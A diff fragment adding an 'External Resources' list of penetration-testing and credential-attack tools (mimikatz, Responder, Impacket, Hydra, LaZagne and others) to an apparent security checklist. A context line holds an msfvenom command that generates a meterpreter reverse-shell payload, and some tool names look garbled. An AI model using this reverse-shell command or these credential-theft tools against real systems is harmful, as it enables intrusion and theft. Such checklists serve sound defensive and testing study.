@@ -294,6 +294,29 @@ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf > shell
 - [x] threat情报 feeds
 - [x] Zero-day tracking
 
+## External Resources
+- [x]awesome-security-audit - Security audit tools collection
+- [x]SecLists - Password/user wordlists (kali: /usr/share/seclists)
+- [x]PayloadsAllTheThings - Cloud, Web, API attack payloads
+- [x]ROADtools - Azure AD reconnaissance
+- [x]Spyre - SMB reconnaissance tool
+- [x]r SMTPY - SMTP penetration testing
+- [x]Responder - LLMNR/NBT-NS/mDNS poisoner
+- [x]CrackMapExec - Active Directory testing
+- [x]Impacket - SMB/NTLM exploitation tools
+- [x] Evil-WinRM - Windows REMOTE management
+- [x]NoPacSnatcher - Active Directory exploitation
+- [x]mimikatz - Windows credential extraction
+- [x]LaZagne - Password recovery
+- [x]Hashcat - Password cracking
+- [x]John the Ripper - Password cracking
+- [x]Hydra - Online password attacks
+- [x]Medusa - Parallel network login cracker
+- [x] enum4linux - SMB enumeration
+- [x] SMBGhost / SMBleed scanner
+- [x] BlueKitchen - BT/BLE testing
+- [x] HackerDict - Password dictionaries
+
 ## Monitoring & SIEM
 - [x] Log analysis (syslog, Apache, Nginx)
 - [x] IDS/IPS configuration (Snort, Suricata)
